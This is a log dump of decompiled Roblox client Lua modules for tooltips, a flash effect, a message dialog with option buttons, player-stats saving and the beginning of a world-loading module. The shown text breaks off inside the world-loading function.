  04:54:13.755  ----- [2298] ReplicatedStorage.Library.Client.GUIFX.Tooltip -----  -  Editar
  04:54:13.755  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local Players = game:GetService("Players");
local TextService = game:GetService("TextService");
local RunService = game:GetService("RunService");
local m_Variables = require(ReplicatedStorage:WaitForChild("Library").Variables);
local t_PlayerGui = Players.LocalPlayer.PlayerGui;
return function(p1, p2) -- Line: 36
	--[[
		Upvalues:
			[1] = m_Variables
			[2] = t_PlayerGui
			[3] = TextService
			[4] = Players
			[5] = RunService
	--]]
	if m_Variables.Mobile then
		return function() -- Line: 39
		end;
	end
	local table1 = {};
	local TextLabel = nil;
	local bool1 = nil;
	local u1 = t_PlayerGui:FindFirstChild("TooltipsFolder");
	if u1 == nil then
		u1 = Instance.new("ScreenGui");
		u1.Name = "TooltipsFolder";
		u1.DisplayOrder = 999;
		u1.Parent = t_PlayerGui;
	end
	local function Remove() -- Line: 57
		--[[
			Upvalues:
				[1] = TextLabel
		--]]
		if TextLabel then
			TextLabel:Destroy();
		end
	end
	local function Create() -- Line: 64
		--[[
			Upvalues:
				[1] = u1
				[2] = TextLabel
				[3] = p2
				[4] = TextService
				[5] = bool1
				[6] = p1
				[7] = m_Variables
				[8] = Players
				[9] = RunService
		--]]
		u1:ClearAllChildren();
		TextLabel = Instance.new("TextLabel");
		TextLabel.BorderSizePixel = 0;
		TextLabel.BackgroundColor3 = Color3.new(0.35, 0.35, 0.35);
		TextLabel.TextColor3 = Color3.new(1, 1, 1);
		TextLabel.TextSize = 18;
		TextLabel.Font = Enum.Font.FredokaOne;
		TextLabel.Text = p2;
		local UICorner = Instance.new("UICorner");
		UICorner.CornerRadius = UDim.new(1, 0);
		UICorner.Parent = TextLabel;
		local TextSize = TextService:GetTextSize(TextLabel.Text, TextLabel.TextSize, TextLabel.Font, Vector2.new(1000, 1000));
		TextLabel.Size = UDim2.new(0, TextSize.X + 14, 0, TextSize.Y + 8);
		TextLabel.Parent = u1;
		while not bool1 and TextLabel and TextLabel.Parent and p1 and not m_Variables.Mobile do
			local Mouse = Players.LocalPlayer:GetMouse();
			local t_X = Mouse.X;
			local t_Y = Mouse.Y;
			local t_X2 = p1.AbsoluteSize.X;
			local t_Y2 = p1.AbsoluteSize.Y;
			local t_X3 = p1.AbsolutePosition.X;
			local t_Y3 = p1.AbsolutePosition.Y;
			if t_X3 - 10 < t_X and t_X < t_X3 + t_X2 + 10 and t_Y3 - 10 < t_Y and t_Y < t_Y3 + t_Y2 + 10 then
				TextLabel.Position = UDim2.new(0, Mouse.X + 17, 0, Mouse.Y);
			else
				bool1 = true;
			end
			RunService.RenderStepped:Wait();
		end
		if TextLabel then
			TextLabel:Destroy();
		end
	end
	table1[#table1 + 1] = p1.MouseEnter:Connect(function() -- Line: 118
		--[[
			Upvalues:
				[1] = TextLabel
				[2] = Create
		--]]
		if TextLabel then
			TextLabel:Destroy();
		end
		Create();
	end);
	table1[#table1 + 1] = p1.MouseLeave:Connect(function() -- Line: 124
		--[[
			Upvalues:
				[1] = TextLabel
		--]]
		if TextLabel then
			TextLabel:Destroy();
		end
	end);
	return function() -- Line: 130
		--[[
			Upvalues:
				[1] = table1
				[2] = bool1
		--]]
		for _, val1 in ipairs(table1) do
			val1:Disconnect();
		end
		table1 = {};
		bool1 = true;
	end;
end;
  -  Editar
  04:54:13.755    -  Editar
  04:54:13.755  ----- [2299] ReplicatedStorage.Library.Client.GUIFX.Flash -----  -  Editar
  04:54:13.755  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local _ = game:GetService("RunService");
local m_Functions = require(ReplicatedStorage:WaitForChild("Library").Functions);
local m_GetHolder = require(script.Parent.GetHolder);
return function(p1, p2, p3, p4) -- Line: 36
	--[[
		Upvalues:
			[1] = m_GetHolder
			[2] = m_Functions
	--]]
	local u1 = p1 or 1;
	local u2 = p2 or 1;
	local u3 = p3 or Color3.new(1, 1, 1);
	local u4 = p4 or 0;
	task.spawn(function() -- Line: 44
		--[[
			Upvalues:
				[1] = u3
				[2] = m_GetHolder
				[3] = u1
				[4] = m_Functions
				[5] = u4
				[6] = u2
		--]]
		local Frame = Instance.new("Frame");
		Frame.BackgroundTransparency = 1;
		Frame.BackgroundColor3 = u3;
		Frame.Size = UDim2.new(2, 0, 2, 0);
		Frame.AnchorPoint = Vector2.new(0.5, 0.5);
		Frame.Position = UDim2.new(0.5, 0, 0.5, 0);
		Frame.BorderSizePixel = 0;
		Frame.Parent = m_GetHolder();
		if u1 > 0 then
			m_Functions.Tween(Frame, {BackgroundTransparency = u4}, {
				u1,
				"Expo",
				"Out"
			});
			wait(u1);
		else
			Frame.BackgroundTransparency = u4;
		end
		if u2 > 0 then
			m_Functions.Tween(Frame, {BackgroundTransparency = 1}, {
				u2,
				"Sine",
				"Out"
			});
			wait(u2);
		else
			Frame.BackgroundTransparency = 1;
		end
		Frame:Destroy();
	end);
end;
  -  Editar
  04:54:13.755    -  Editar
  04:54:13.755  ----- [2300] ReplicatedStorage.Library.Client.Message -----  -  Editar
  04:54:13.755  --[[    
                                                                   ,,╓╓╖╖╥╥@@@,,,╓╖╖╖
                                                            ,,╓╓╖╖╖@@@╢╢║╢╢╣▒▒▒▒▒▒▒▒▒
                                          ,,,╓╖╖╖╥@@@╢╢╢╢╢▒▒▒╢╢╜╜╙````"╙╜╢╣▒▒▒▒▒▒▒▒▒▒
                         ,,,╓╖╖╥@@@@╢║╢╢▒▒╢╢╢Ñ╨╨╨▒▒▒▒▒▒▒▒▒╢╜`              ╙╢▒▒▒▒▒▒▒▒
        ,,╓╖╖╖╥@@@╢╢╢╢╢▒▒╢╢╢╢╢╢╢▒▒▒▒▒▒▒▒▒▒       ╢▒▒▒▒▒▒▒╜                   ╙╢▒▒▒▒▒▒
        ]▒▒▒▒▒╜╜╙"``              ╙╢▒▒▒▒▒▒░      ║▒▒▒▒▒▒╜       ╥@╣╢╢@╖       ,╢▒▒▒▒▒▒
         ▒▒▒▒▒L                     ╙╢▒▒▒▒▒      ]▒▒▒▒▒▒      ,╣▒▒▒▒▒▒▒╢╖,╓@╣╢▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒        ,,,╓╓╓,       ]▒▒▒▒╣       ╢▒▒▒▒       ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒       ╢▒▒▒▒▒▒▒@       ▒▒▒▒▒       ║▒▒▒▒       ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ]▒▒▒▒▒       ║▒▒▒▒▒▒▒Ñ      ,▒▒▒▒▒▒      ]▒▒▒▒       ╢▒▒▒▒▒╜╜╜╙"``     └▒▒▒▒▒▒s
          ▒▒▒▒▒▒      ╙╝╨╜╜╜╙       ╓╢▒▒▒▒▒▒      └▒▒▒▒       ║▒▒▒▒▒             ╢▒▒▒▒▒
          ║▒▒▒▒▒                   ╙╨╢▒▒▒▒▒╢       ║▒▒▒H      ╙▒▒▒▒▒▒            ║▒▒▒▒▒░
          ]▒▒▒▒▒                      ╙╢▒▒▒▒       ║▒▒▒╢       ║▒▒▒▒╢@@@╣╢C      ]▒▒▒▒▒▒
           ▒▒▒▒▒~      ╓╖╥@@@@@@,      `╢▒▒▒▒      ]▒▒▒▒H       ╙╣▒▒▒▒▒▒▒╜        ▒▒▒▒▒▒
           ║▒▒▒▒▒      ]▒▒▒▒▒▒▒▒▒∩      ║▒▒▒╣       ▒▒▒▒▒╖        ╙╨╝╝╜╜          ║▒▒▒▒▒
           ║▒▒▒▒╣       ╢▒▒▒▒▒▒▒▒░      ]▒▒▒▒       ║▒▒▒▒▒Ñ                       ╠▒▒▒▒▒∩
           └▒▒▒▒▒       ║▒▒╢╢╢╝╜`       ║▒▒▒▒▒      ]▒▒▒▒▒▒▒@╖             ╓╣.,,,╓║▒▒▒▒▒▒
            ╢▒▒▒▒▒                     ║▒▒▒▒▒▒      └▒▒▒▒▒▒▒▒▒╣╢@╥╖╖╖╖╖@@╢▒▒▒▒▒╢╢╢╝╨╜╜╜╙"
            ║▒▒▒▒▒                  ╓@╢▒▒▒▒▒▒▒╖╓╖╖╥@@▒▒▒▒▒▒▒▒▒╢╢╢╨╜╜╜╜╙╙``
            ]▒▒▒▒▒        ,,,╓╓╖@@╣╢▒▒▒▒▒▒▒▒▒╢║╨╨╜╜╜╙╙"``        ,,╓╓╖╥╗   ,@╢▒▒▒╣╣╗
             ▒▒▒▒▒Ñ@╣╢╢╣▒▒▒╢╢║╨╨╜╜╜╙╙`'        ,,,╓╖,    ║╣╢   ╢▒▒▒▒▒▒╢╢H ╓▒▒╢╙``╙╨Ñ
             ╨╜╜╜╜╙"``            ╓╥@@@╥╖    ║▒▒▒▒▒▒▒▒N  ║▒▒[  ║▒▒U       ]▒▒╢╖,,
                     ╓╣╢▒▒╢╣╖   ╓╢▒▒Ñ╨╣▒▒╢,  ║▒▒[   ║▒▒H ]▒▒╢  ]▒▒║╖╖╥╗╖   ╙╢▒▒▒▒▒╣╣╖
                    ╢▒▒╜""╙▒▒Ñ  ╢▒▒     ╢▒╣  ]▒▒▒   ║▒▒▒  ▒▒▒   ▒▒▒╢╢Ñ╝╨       `"╙╢▒▒H
                   ]▒▒▒    `    ▒▒▒     ╠▒▒[  ▒▒▒╢╣▒▒▒╝   ║▒▒∩  ║▒▒        ╓╣╖,,,╓╢▒▒`
                   ║▒▒▒         ╢▒▒     ]▒▒[  ║▒▒╜``      ]▒▒▒  ]▒▒N@@Ñ╣╣╢ ╙╢▒▒▒▒▒▒Ñ`
                   └▒▒╢     ╖╖, ╙▒▒╢    ║▒▒┘  ║▒▒▒         ▒▒╢  ]╢╢╢╝╝╨╜╜╙
                    ╙▒▒╣╖,,╥▒▒Ñ  ╙╢▒▒╢╢▒▒╢╜   └╢╢▒
                     ╙╢▒▒▒▒▒╢╜      ╙╜
                                 

	BIG Copies rbx.lua Framework [2023] - [2023]
	Written by OneX - 1037898275229020250
	Developed with a keyboard and pixie dust.
	
	-+-+-+- SPECIFICS -+-+-+-
	_L.Message
	===========
		
	===========
	
--]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local table1 = {};
local ReplicatedStorage = game:GetService("ReplicatedStorage");
local RunService = game:GetService("RunService");
local GuiService = game:GetService("GuiService");
local Players = game:GetService("Players");
local UserInputService = game:GetService("UserInputService");
local Library = ReplicatedStorage:WaitForChild("Library");
local Client = Library:WaitForChild("Client");
local m_Variables = require(Library.Variables);
local m_GUI = require(Client.GUI);
local m_GUIFX = require(Client.GUIFX);
local m_Audio = require(Library.Audio);
local t_Message = m_GUI.Message;
local bool1 = false;
local Connect_ret = nil;
local table2 = {};
function table1.New(p1, ...) 
	local table3 = {...};
	if m_Variables.MessageOpen == true then
		repeat
			RunService.RenderStepped:Wait();
		until not m_Variables.MessageOpen;
	end
	local v1 = table3[1] == nil and table3[2] == nil or false;
	local v2 = type(table3[1]) == "boolean" and (table3[2] == nil and true or typeof(table3[2]) == "number") or false;
	local v3 = table3[1] and table3[2];
	local v4 = v2 and table3[2] ~= nil and typeof(table3[2]) == "number" and table3[3] == true and table3[2] or nil;
	local _ = workspace:GetServerTimeNow();
	t_Message.Yes.Visible = false;
	t_Message.No.Visible = false;
	t_Message.Ok.Visible = false;
	t_Message.Option1.Visible = false;
	t_Message.Option2.Visible = false;
	t_Message.OptionA.Visible = false;
	t_Message.OptionB.Visible = false;
	t_Message.OptionC.Visible = false;
	t_Message.Cancel.Visible = false;
	t_Message.Desc.Text = p1;
	for _, child1 in ipairs(t_Message.Desc:GetChildren()) do
		if child1.ClassName ~= "TextLabel" then continue end
		child1.Text = t_Message.Desc.Text;
	end
	if not v1 then
		if v2 then
			local _ = table3[1];
			t_Message.Yes.Visible = true;
			t_Message.No.Visible = true;
			if v4 ~= nil then
				local u11 = v4;
				local t_Image = t_Message.Yes.Image;
				local t_HoverImage = t_Message.Yes.HoverImage;
				local t_PressedImage = t_Message.Yes.PressedImage;
				t_Message.Yes.Image = "rbxassetid://11632629004";
				t_Message.Yes.HoverImage = "rbxassetid://11632629074";
				t_Message.Yes.PressedImage = "rbxassetid://11632629074";
				t_Message.Yes.Active = false;
				t_Message.Yes.TextLabel.Text = "Wait " .. tostring(u11);
				local u12 = 0;
				Connect_ret = RunService.Heartbeat:Connect(function(p4)
					u12 = u12 + p4;
					if u12 >= 1 then
						u12 = 0;
						u11 = u11 - 1;
						if u11 == 0 then
							t_Message.Yes.Active = true;
							t_Message.Yes.TextLabel.Text = "Yes";
							local t_Yes2 = t_Message.Yes;
							local t_Yes3 = t_Message.Yes;
							local t_Yes4 = t_Message.Yes;
							local v10 = t_HoverImage;
							local v11 = t_PressedImage;
							t_Yes2.Image = t_Image;
							t_Yes3.HoverImage = v10;
							t_Yes4.PressedImage = v11;
							Connect_ret:Disconnect();
							return;
						end
						t_Message.Yes.TextLabel.Text = "Wait " .. tostring(u11);
					end
				end);
			end
		elseif v3 then
			if not table3[3] then
				local v5 = table3[1];
				local v6 = table3[2];
				t_Message.Option1.TextLabel.Text = v5;
				t_Message.Option2.TextLabel.Text = v6;
				t_Message.Option1.Visible = true;
				t_Message.Option2.Visible = true;
				t_Message.Cancel.Visible = true;
			else
				local v7 = table3[1];
				local v8 = table3[2];
				local v9 = table3[3];
				t_Message.OptionA.TextLabel.Text = v7;
				t_Message.OptionB.TextLabel.Text = v8;
				t_Message.OptionC.TextLabel.Text = v9;
				t_Message.OptionA.Visible = true;
				t_Message.OptionB.Visible = true;
				t_Message.OptionC.Visible = true;
				t_Message.Cancel.Visible = true;
			end
		end
	else
		t_Message.Ok.Visible = true;
	end
	local u1 = nil;
	local function SetupClickEvent(p2, p3) 
		table2[#table2 + 1] = p2.Activated:Connect(function()
			if bool1 == false then
				bool1 = true;
				p3();
				bool1 = false;
			end
		end);
	end
	if t_Message.No.Visible then
		local t_No = t_Message.No;
		local function u2() 
			Close();
			u1 = false;
		end
		table2[#table2 + 1] = t_No.Activated:Connect(function() 
			if bool1 == false then
				bool1 = true;
				u2();
				bool1 = false;
			end
		end);
	end
	if t_Message.Yes.Visible then
		local t_Yes = t_Message.Yes;
		local function u3()
			Close();
			u1 = true;
		end
		table2[#table2 + 1] = t_Yes.Activated:Connect(function()
			if bool1 == false then
				bool1 = true;
				u3();
				bool1 = false;
			end
		end);
	end
	if t_Message.Ok.Visible then
		local t_Ok = t_Message.Ok;
		local function u4() 
			Close();
			u1 = true;
		end
		table2[#table2 + 1] = t_Ok.Activated:Connect(function() 
			if bool1 == false then
				bool1 = true;
				u4();
				bool1 = false;
			end
		end);
	end
	if t_Message.Option1.Visible then
		local t_Option1 = t_Message.Option1;
		local function u5() 
			Close();
			u1 = 1;
		end
		table2[#table2 + 1] = t_Option1.Activated:Connect(function() 
			if bool1 == false then
				bool1 = true;
				u5();
				bool1 = false;
			end
		end);
	end
	if t_Message.Option2.Visible then
		local t_Option2 = t_Message.Option2;
		local function u6() 
			Close();
			u1 = 2;
		end
		table2[#table2 + 1] = t_Option2.Activated:Connect(function() 
			if bool1 == false then
				bool1 = true;
				u6();
				bool1 = false;
			end
		end);
	end
	if t_Message.OptionA.Visible then
		local t_OptionA = t_Message.OptionA;
		local function u7() 
			Close();
			u1 = 1;
		end
		table2[#table2 + 1] = t_OptionA.Activated:Connect(function() 
			if bool1 == false then
				bool1 = true;
				u7();
				bool1 = false;
			end
		end);
	end
	if t_Message.OptionB.Visible then
		local t_OptionB = t_Message.OptionB;
		local function u8() 
			Close();
			u1 = 2;
		end
		table2[#table2 + 1] = t_OptionB.Activated:Connect(function()
			if bool1 == false then
				bool1 = true;
				u8();
				bool1 = false;
			end
		end);
	end
	if t_Message.OptionC.Visible then
		local t_OptionC = t_Message.OptionC;
		local function u9() 
			Close();
			u1 = 3;
		end
		table2[#table2 + 1] = t_OptionC.Activated:Connect(function() 
			if bool1 == false then
				bool1 = true;
				u9();
				bool1 = false;
			end
		end);
	end
	if t_Message.Cancel.Visible then
		local t_Cancel = t_Message.Cancel;
		local function u10() 
			Close();
			u1 = false;
		end
		table2[#table2 + 1] = t_Cancel.Activated:Connect(function()
			if bool1 == false then
				bool1 = true;
				u10();
				bool1 = false;
			end
		end);
	end
	if m_Variables.Console then
		if t_Message.Ok.Visible then
			GuiService.SelectedObject = t_Message.Ok;
		elseif t_Message.Yes.Visible then
			GuiService.SelectedObject = t_Message.Yes;
		elseif t_Message.Option1.Visible then
			GuiService.SelectedObject = t_Message.Option1;
		end
		local bool2 = false;
		local bool3 = false;
		table2[#table2 + 1] = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent) 
			if not bool3 then
				bool3 = true;
				if input.KeyCode == Enum.KeyCode.ButtonB then
					bool2 = true;
				end
				bool3 = false;
			end
		end);
		local bool4 = false;
		table2[#table2 + 1] = UserInputService.InputEnded:Connect(function(input2, gameProcessedEvent2) 
			if not bool2 then return end
			if not bool4 then
				bool4 = true;
				if input2.KeyCode == Enum.KeyCode.ButtonB then
					m_Audio.Play(5074101610, Players.LocalPlayer.PlayerGui);
					Close();
					u1 = false;
				end
				bool4 = false;
			end
		end);
	end
	m_Audio.Play("rbxassetid://7139316734", script, 1, 0.5);
	if not v1 and (v2 or v3) then
		m_Audio.Play("rbxassetid://7009855114", script, 1, 0.5);
	end
	Open();
	repeat
		RunService.RenderStepped:Wait();
	until u1 ~= nil;
	assert(u1 ~= nil);
	return u1;
end
m_GUIFX.ButtonFX(t_Message.Ok);
m_GUIFX.ButtonFX(t_Message.Cancel);
m_GUIFX.ButtonFX(t_Message.Yes);
m_GUIFX.ButtonFX(t_Message.No);
m_GUIFX.ButtonFX(t_Message.Option1);
m_GUIFX.ButtonFX(t_Message.Option2);
function table1.IsOpen() 
	return t_Message.Gui.Enabled;
end
function Close() 
	for _, val2 in ipairs(table2) do
		val2:Disconnect();
	end
	table2 = {};
	if Connect_ret then
		Connect_ret:Disconnect();
	end
	t_Message.Gui.Enabled = false;
	m_Variables.MessageOpen = false;
	if m_Variables.Console then
		GuiService.SelectedObject = nil;
	end
end
function Open() 
	t_Message.Gui.Enabled = true;
	m_Variables.MessageOpen = true;
end

local Network = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client").Network)
Network.Fired("Message"):Connect(function(p1, ...)
	table1.New(p1, ...)
end)

return table1;
  -  Editar
  04:54:13.755    -  Editar
  04:54:13.755  ----- [2301] ReplicatedStorage.Library.Client.Save -----  -  Editar
  04:54:13.755  local v1 = {};
local l__ReplicatedStorage__2 = game:GetService("ReplicatedStorage");
local l__Players__3 = game:GetService("Players");
local l__ReplicatedFirst__4 = game:GetService("ReplicatedFirst");
local l__Library__5 = l__ReplicatedStorage__2:WaitForChild("Library");
local l__Client__6 = l__Library__5:WaitForChild("Client");
local v7 = require(l__Library__5.Signal);
local v8 = require(l__Client__6.Network);
local v9 = require(l__Client__6.Settings);
local v10 = require(l__ReplicatedStorage__2:WaitForChild("X"):WaitForChild("Util").Mutex);
local v11 = require(l__Library__5:WaitForChild("Modules").DefaultStats);
local u1 = {};
l__Players__3.PlayerRemoving:Connect(function(p1)
	local v12 = u1[p1];
	if v12 then
		u1[p1] = nil;
		v12:destroy();
	end;
end);
local u2 = {};
function v1.GetSaves()
	return u2;
end;
function v1.Get(p2, p3)
	local v13 = true;
	if p3 ~= nil then
		v13 = p3 == true;
	end;
	local v14 = p2 or l__Players__3.LocalPlayer;
	if not v14 or not v14.Parent then
		return nil;
	end;
	if v13 then
		return u2[v14];
	end;
	local v15 = u1[v14];
	if not v15 then
		v15 = v10.new();
		u1[v14] = v15;
	end;
	local v16, v17 = v15:runLocked(function()
		if not v14 or not v14.Parent then
			return nil;
		end;
		if not Update(v14) and v14 and v14 == l__Players__3.LocalPlayer then
			while true do
				wait(1);
				if not v14 then
					break;
				end;
				if not v14.Parent then
					break;
				end;
				if Update(v14) then
					break;
				end;			
			end;
		end;
		if not v14 then
			return nil;
		end;
		return u2[v14];
	end);
	if v16 then
		return v17;
	end;
	return nil;
end;
function Update(p4)
	local v18 = false;
	if typeof(p4) == "Instance" then
		v18 = p4:IsA("Player");
	end;
	assert(v18);
	local l__UserId__19 = p4.UserId;
	local v20 = p4 == l__Players__3.LocalPlayer;
	local v21, v22 = pcall(function()
		return v8.Invoke("Get Stats", p4);
	end);
	if not v21 then
		warn(string.format("[SAVE] Player '%d' save failed to load: '%s'", l__UserId__19, tostring(v22)));
		return false;
	end;
	if not p4 then
		warn(string.format("[SAVE] Player '%d' logged out while loading save", l__UserId__19));
		return false;
	end;
	if not v22 then
		return false;
	end;
	if typeof(v22) ~= "table" then
		warn(string.format("[SAVE] Player '%d' save was invalid type: '%s'", l__UserId__19, (typeof(v22))));
		if v20 then
			p4.Character = nil;
			p4:Kick("Something went wrong. Please rejoin!");
		end;
		return false;
	end;
	for v26, v27 in pairs(v22) do
		if typeof(v27) == "table" then
			if not v9.StatsNoFreeze[v26] then
				table.freeze(v27);
			end;
		end;	
	end;
	local v28 = u2[p4];
	if v28 then
		for v32, v33 in pairs(v22) do
			v28[v32] = v33;		
		end;
		for v37, v38 in pairs(v28) do
			v28[v37] = v22[v37];		
		end;
	else
		u2[p4] = v22;
	end;
	if v20 then
		v7.Fire("Loaded Stats", p4);
	else
		v7.Fire("Loaded Other Stats", p4);
	end;
	return true;
end;
function ProcessChanges(p5, p6)
	assert(typeof(p6) == "table");
	local v39 = false;
	if typeof(p5) == "Instance" then
		v39 = p5:IsA("Player");
	end;
	assert(v39);
	local v40 = u2[p5];
	if v40 then
		for v44, v45 in pairs(p6) do
			if typeof(v45) == "table" then
				if not v9.StatsNoFreeze[v44] then
					table.freeze(v45);
				end;
			end;
			v40[v44] = v45;		
		end;
		local v46 = p5 == l__Players__3.LocalPlayer;
		for v50, v51 in pairs(p6) do
			if v46 then
				v7.Fire("Stat Changed", v50);
			else
				v7.Fire("Other Stat Changed", p5, v50);
			end;		
		end;
		if v46 then
			v7.Fire("Stats Changed");
			return;
		end;
		v7.Fire("Other Stats Changed", p5);
	end;
end;
function v1.FetchPlayer(p7)
	local v52 = false;
	if typeof(p7) == "Instance" then
		v52 = p7:IsA("Player");
	end;
	assert(v52);
	local v53 = u1[p7];
	if not v53 then
		v53 = v10.new();
		u1[p7] = v53;
	end;
	v53:runLocked(function()
		while p7 and not u2[p7] do
			Update(p7);
			if not p7 then
				break;
			end;
			if u2[p7] then
				break;
			end;
			wait(0.5);		
		end;
	end);
end;
v8.Fired("New Stats"):Connect(function(p8, p9)
	ProcessChanges(p9 or l__Players__3.LocalPlayer, p8);
end);
game.Players.PlayerAdded:Connect(function(p10)
	task.spawn(v1.FetchPlayer, p10);
end);
game.Players.PlayerRemoving:Connect(function(p11)
	if u2[p11] then
		task.delay(5, function()
			u2[p11] = nil;
			v7.Fire("Stats Removed", p11);
		end);
	end;
end);
for v54, v55 in ipairs(l__Players__3:GetPlayers()) do
	task.spawn(v1.FetchPlayer, v55);
end;
return v1;
  -  Editar
  04:54:13.757    -  Editar
  04:54:13.757  ----- [2302] ReplicatedStorage.Library.Client.WorldCmds -----  -  Editar
  04:54:13.757  --[[    
                                                                   ,,╓╓╖╖╥╥@@@,,,╓╖╖╖
                                                            ,,╓╓╖╖╖@@@╢╢║╢╢╣▒▒▒▒▒▒▒▒▒
                                          ,,,╓╖╖╖╥@@@╢╢╢╢╢▒▒▒╢╢╜╜╙````"╙╜╢╣▒▒▒▒▒▒▒▒▒▒
                         ,,,╓╖╖╥@@@@╢║╢╢▒▒╢╢╢Ñ╨╨╨▒▒▒▒▒▒▒▒▒╢╜`              ╙╢▒▒▒▒▒▒▒▒
        ,,╓╖╖╖╥@@@╢╢╢╢╢▒▒╢╢╢╢╢╢╢▒▒▒▒▒▒▒▒▒▒       ╢▒▒▒▒▒▒▒╜                   ╙╢▒▒▒▒▒▒
        ]▒▒▒▒▒╜╜╙"``              ╙╢▒▒▒▒▒▒░      ║▒▒▒▒▒▒╜       ╥@╣╢╢@╖       ,╢▒▒▒▒▒▒
         ▒▒▒▒▒L                     ╙╢▒▒▒▒▒      ]▒▒▒▒▒▒      ,╣▒▒▒▒▒▒▒╢╖,╓@╣╢▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒        ,,,╓╓╓,       ]▒▒▒▒╣       ╢▒▒▒▒       ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒       ╢▒▒▒▒▒▒▒@       ▒▒▒▒▒       ║▒▒▒▒       ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ]▒▒▒▒▒       ║▒▒▒▒▒▒▒Ñ      ,▒▒▒▒▒▒      ]▒▒▒▒       ╢▒▒▒▒▒╜╜╜╙"``     └▒▒▒▒▒▒s
          ▒▒▒▒▒▒      ╙╝╨╜╜╜╙       ╓╢▒▒▒▒▒▒      └▒▒▒▒       ║▒▒▒▒▒             ╢▒▒▒▒▒
          ║▒▒▒▒▒                   ╙╨╢▒▒▒▒▒╢       ║▒▒▒H      ╙▒▒▒▒▒▒            ║▒▒▒▒▒░
          ]▒▒▒▒▒                      ╙╢▒▒▒▒       ║▒▒▒╢       ║▒▒▒▒╢@@@╣╢C      ]▒▒▒▒▒▒
           ▒▒▒▒▒~      ╓╖╥@@@@@@,      `╢▒▒▒▒      ]▒▒▒▒H       ╙╣▒▒▒▒▒▒▒╜        ▒▒▒▒▒▒
           ║▒▒▒▒▒      ]▒▒▒▒▒▒▒▒▒∩      ║▒▒▒╣       ▒▒▒▒▒╖        ╙╨╝╝╜╜          ║▒▒▒▒▒
           ║▒▒▒▒╣       ╢▒▒▒▒▒▒▒▒░      ]▒▒▒▒       ║▒▒▒▒▒Ñ                       ╠▒▒▒▒▒∩
           └▒▒▒▒▒       ║▒▒╢╢╢╝╜`       ║▒▒▒▒▒      ]▒▒▒▒▒▒▒@╖             ╓╣.,,,╓║▒▒▒▒▒▒
            ╢▒▒▒▒▒                     ║▒▒▒▒▒▒      └▒▒▒▒▒▒▒▒▒╣╢@╥╖╖╖╖╖@@╢▒▒▒▒▒╢╢╢╝╨╜╜╜╙"
            ║▒▒▒▒▒                  ╓@╢▒▒▒▒▒▒▒╖╓╖╖╥@@▒▒▒▒▒▒▒▒▒╢╢╢╨╜╜╜╜╙╙``
            ]▒▒▒▒▒        ,,,╓╓╖@@╣╢▒▒▒▒▒▒▒▒▒╢║╨╨╜╜╜╙╙"``        ,,╓╓╖╥╗   ,@╢▒▒▒╣╣╗
             ▒▒▒▒▒Ñ@╣╢╢╣▒▒▒╢╢║╨╨╜╜╜╙╙`'        ,,,╓╖,    ║╣╢   ╢▒▒▒▒▒▒╢╢H ╓▒▒╢╙``╙╨Ñ
             ╨╜╜╜╜╙"``            ╓╥@@@╥╖    ║▒▒▒▒▒▒▒▒N  ║▒▒[  ║▒▒U       ]▒▒╢╖,,
                     ╓╣╢▒▒╢╣╖   ╓╢▒▒Ñ╨╣▒▒╢,  ║▒▒[   ║▒▒H ]▒▒╢  ]▒▒║╖╖╥╗╖   ╙╢▒▒▒▒▒╣╣╖
                    ╢▒▒╜""╙▒▒Ñ  ╢▒▒     ╢▒╣  ]▒▒▒   ║▒▒▒  ▒▒▒   ▒▒▒╢╢Ñ╝╨       `"╙╢▒▒H
                   ]▒▒▒    `    ▒▒▒     ╠▒▒[  ▒▒▒╢╣▒▒▒╝   ║▒▒∩  ║▒▒        ╓╣╖,,,╓╢▒▒`
                   ║▒▒▒         ╢▒▒     ]▒▒[  ║▒▒╜``      ]▒▒▒  ]▒▒N@@Ñ╣╣╢ ╙╢▒▒▒▒▒▒Ñ`
                   └▒▒╢     ╖╖, ╙▒▒╢    ║▒▒┘  ║▒▒▒         ▒▒╢  ]╢╢╢╝╝╨╜╜╙
                    ╙▒▒╣╖,,╥▒▒Ñ  ╙╢▒▒╢╢▒▒╢╜   └╢╢▒
                     ╙╢▒▒▒▒▒╢╜      ╙╜
                                 

	BIG Copies rbx.lua Framework [2023] - [2023]
	Written by OneX - 1037898275229020250
	Developed with a keyboard and pixie dust.
	
	-+-+-+- SPECIFICS -+-+-+-
	_L.WorldCmds
	===========
		
	===========
	
--]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local WorldCmds = {}
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local __THINGS = workspace:WaitForChild("__THINGS")
local __DEBRIS = workspace:WaitForChild("__DEBRIS")
local Library = ReplicatedStorage:WaitForChild("Library")
local Client = Library:WaitForChild("Client")
----
local Shared = require(Library.Shared)
local Variables = require(Library.Variables)
local Directory = require(Library.Directory)
local Audio = require(Library.Audio)
local Signal = require(Library.Signal)
local Functions = require(Library.Functions)
local GUIFX = require(Client.GUIFX)
local Network = require(Client.Network)
local Save = require(Client.Save)
local GUI = require(Client.GUI)
local Gamepasses = require(Client.Gamepasses)
----
local Coins = __THINGS:WaitForChild("Coins")
local Orbs = __THINGS:WaitForChild("Orbs")
local Lootbags = __THINGS:WaitForChild("Lootbags")
----
local IsHardcore = Shared.IsHardcore
local TeleportID = Directory.Gamepasses.Teleport.ID
----
function WorldCmds.Load(world, arg) 
	Variables.LoadingWorld = true
	
